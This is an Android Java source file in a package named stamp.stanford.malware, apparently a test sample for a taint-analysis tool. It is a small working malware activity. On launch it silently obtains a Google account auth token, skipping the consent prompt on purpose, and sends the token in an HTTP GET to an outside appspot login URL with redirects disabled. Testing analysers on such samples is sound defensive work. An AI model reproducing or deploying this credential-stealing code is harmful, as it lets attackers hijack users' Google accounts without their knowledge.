package stamp.stanford.malware;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.accounts.AccountManagerCallback;
import android.accounts.AccountManagerFuture;
import android.accounts.AuthenticatorException;
import android.accounts.OperationCanceledException;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.AsyncTask;
import android.view.View;
import android.util.Log;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.apache.http.client.params.ClientPNames;
import org.apache.http.client.ClientProtocolException;

import java.io.IOException;
import java.net.MalformedURLException;

public class Malware extends Activity {
    protected AccountManager accountManager;
    protected Intent intent;

    @Override
    public void onCreate(Bundle savedInstanceState) {
	super.onCreate(savedInstanceState);
	accountManager = AccountManager.get(getApplicationContext());
	Account[] accounts = accountManager.getAccountsByType("com.google");
	if(accounts.length > 0) {
	    Account account = accounts[0];
	    accountManager.getAuthToken(account, "ah", false, new GetAuthTokenCallback(), null);
 	}

        setContentView(R.layout.main);
    }

    @Override public void onStart(){
	super.onStart();
    }

    private class GetAuthTokenCallback implements AccountManagerCallback<Bundle> {
	public void run(AccountManagerFuture<Bundle> result) {
	    Bundle bundle;
	    try {
		bundle = result.getResult();
		Intent intent = (Intent)bundle.get(AccountManager.KEY_INTENT);
		if(intent != null) {
		    // User input required, do nothing

		    // technically you would do this, but this is malware!
		    // startActivity(intent);
		} else {
		    // the malware hopes that it doesn't need user input

		    // this is the tainted data
		    String auth_token = bundle.getString(AccountManager.KEY_AUTHTOKEN);
		    new LeakInfo().execute(auth_token);
		}
	    } catch(OperationCanceledException e) {
	    } catch(AuthenticatorException e) {
	    } catch(IOException e) {
	    }
	}
    }

    private class LeakInfo extends AsyncTask<String, Void, Void> {
	protected Void doInBackground(String... tokens) {
	    DefaultHttpClient http_client = new DefaultHttpClient();
	    try {
		// don't follow redirects
		http_client.getParams().setBooleanParameter(ClientPNames.HANDLE_REDIRECTS, false);
		HttpGet http_get = new HttpGet("https://app.appspot.com/_ah/login?continue=http://localhost/&auth=" + tokens[0]);
		HttpResponse response = http_client.execute(http_get);
	    } catch(ClientProtocolException e) {
	    } catch(IOException e) {
	    } finally {
		http_client.getParams().setBooleanParameter(ClientPNames.HANDLE_REDIRECTS, true);
	    }
	    return null;
	}
    }
}